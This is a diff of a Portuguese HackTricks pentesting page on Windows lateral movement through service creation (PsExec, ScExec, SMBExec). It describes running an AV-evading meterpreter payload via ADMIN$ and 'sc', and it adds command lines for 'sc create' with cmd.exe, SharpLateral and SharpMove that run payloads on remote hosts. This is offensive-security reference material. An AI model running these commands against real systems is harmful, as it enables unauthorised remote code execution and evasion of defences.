@@ -1,4 +1,4 @@
-# PsExec/Winexec/ScExec
+# PsExec/Winexec/ScExec/SMBExec
 
 {{#include ../../banners/hacktricks-training.md}}
 
@@ -13,11 +13,12 @@ O processo é descrito nos passos abaixo, ilustrando como os binários de servi�
 
 ### **Processo de Execução Manual do PsExec**
 
-Assumindo que há um payload executável (criado com msfvenom e ofuscado usando Veil para evadir a detecção de antivírus), nomeado 'met8888.exe', representando um payload reverse_http do meterpreter, os seguintes passos são tomados:
+Assumindo que há um payload executável (criado com msfvenom e ofuscado usando Veil para evadir a detecção de antivírus), nomeado 'met8888.exe', representando um payload meterpreter reverse_http, os seguintes passos são tomados:
 
 - **Cópia do binário**: O executável é copiado para o compartilhamento ADMIN$ a partir de um prompt de comando, embora possa ser colocado em qualquer lugar no sistema de arquivos para permanecer oculto.
+- Em vez de copiar o binário, também é possível usar um binário LOLBAS como `powershell.exe` ou `cmd.exe` para executar comandos diretamente a partir dos argumentos. Ex.: `sc create [ServiceName] binPath= "cmd.exe /c [PayloadCommand]"`
 - **Criação de um serviço**: Utilizando o comando `sc` do Windows, que permite consultar, criar e deletar serviços do Windows remotamente, um serviço chamado "meterpreter" é criado para apontar para o binário carregado.
-- **Iniciando o serviço**: O passo final envolve iniciar o serviço, o que provavelmente resultará em um erro de "timeout" devido ao binário não ser um verdadeiro binário de serviço e falhar em retornar o código de resposta esperado. Este erro é irrelevante, pois o objetivo principal é a execução do binário.
+- **Iniciando o serviço**: O passo final envolve iniciar o serviço, o que provavelmente resultará em um erro de "time-out" devido ao binário não ser um verdadeiro binário de serviço e falhar em retornar o código de resposta esperado. Este erro é irrelevante, pois o objetivo principal é a execução do binário.
 
 A observação do listener do Metasploit revelará que a sessão foi iniciada com sucesso.
 
@@ -25,12 +26,24 @@ A observação do listener do Metasploit revelará que a sessão foi iniciada co
 
 Encontre passos mais detalhados em: [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
 
-**Você também pode usar o binário PsExec.exe do Windows Sysinternals:**
+- Você também pode usar o **binário PsExec.exe do Windows Sysinternals**:
 
 ![](<../../images/image (928).png>)
 
-Você também pode usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
+Ou acessá-lo via webddav:
+```bash
+\\live.sysinternals.com\tools\PsExec64.exe -accepteula
+```
+- Você também pode usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
 SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
 ```
+- Você também pode usar [**SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
+SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
+```
+- Você também pode usar **Impacket's `psexec` e `smbexec.py`**.
+
+
 {{#include ../../banners/hacktricks-training.md}}
